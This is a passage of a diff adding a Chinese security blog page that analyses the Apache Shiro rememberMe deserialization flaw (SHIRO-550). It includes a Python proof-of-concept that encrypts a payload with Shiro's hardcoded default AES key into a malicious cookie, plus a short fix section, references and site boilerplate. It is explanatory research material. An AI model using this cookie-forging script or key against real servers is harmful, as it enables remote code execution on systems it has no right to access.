BS)).encode()</span><br><span class="line">	key = <span class="string">"kPH+bIxk5D2deZiIxcaaaA=="</span></span><br><span class="line">	mode = AES.MODE_CBC</span><br><span class="line">	iv = uuid.uuid4().bytes</span><br><span class="line">	encryptor = AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">	file_body = pad(popen.stdout.read())</span><br><span class="line">	base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))</span><br><span class="line">	<span class="keyword">return</span> base64_ciphertext</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	command = <span class="string">"open /Applications/Calculator.app"</span></span><br><span class="line">	payload = encode_rememberme(command)</span><br><span class="line">	<span class="keyword">with</span> open(<span class="string">"/Users/xxx/Desktop/payload.cookie"</span>,<span class="string">"w"</span>) <span class="keyword">as</span> fpw:</span><br><span class="line">		print(<span class="string">"rememberMe=&#123;&#125;"</span>.format(payload.decode()),file=fpw)</span><br></pre></td></tr></table></figure>
+
+<h1 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h1><p>官方修复的方式是通过去掉硬编码的密钥，使其每次生成一个密钥来解决该问题。然而，一些开源系统会使用固定的编码，通过搜索引擎、github来收集密钥，或许可以对该漏洞进行成功利用。</p>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ul>
+<li><a href="https://www.anquanke.com/post/id/192619" target="_blank" rel="noopener">Java反序列化利用链分析之Shiro反序列化</a></li>
+<li><a href="http://www.lmxspace.com/2019/10/17/Shiro-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AE%B0%E5%BD%95/" target="_blank" rel="noopener">Shiro-反序列化记录</a></li>
+<li><a href="https://blog.zsxsoft.com/post/35" target="_blank" rel="noopener">强网杯“彩蛋”——Shiro 1.2.4(SHIRO-550)漏洞之发散性思考</a></li>
+</ul>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/05/08/cbc-reverse/" rel="prev" title="CBC字节翻转攻击">
+      <i class="fa fa-chevron-left"></i> CBC字节翻转攻击
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞信息"><span class="nav-number">1.</span> <span class="nav-text">漏洞信息</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#影响版本"><span class="nav-number">1.1.</span> <span class="nav-text">影响版本</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#组件"><span class="nav-number">1.2.</span> <span class="nav-text">组件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞原理"><span class="nav-number">1.3.</span> <span class="nav-text">漏洞原理</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#反序列化分析"><span class="nav-number">2.</span> <span class="nav-text">反序列化分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie生成过程"><span class="nav-number">2.1.</span> <span class="nav-text">cookie生成过程</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#cookie的反序列化过程"><span class="nav-number">2.2.</span> <span class="nav-text">cookie的反序列化过程</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#漏洞利用分析"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#修复"><span class="nav-number">4.</span> <span class="nav-text">修复</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-number">5.</span> <span class="nav-text">参考</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ananaskr</p>
+  <div class="site-description" itemprop="description"></div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">17</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ananaskr</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://muse.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
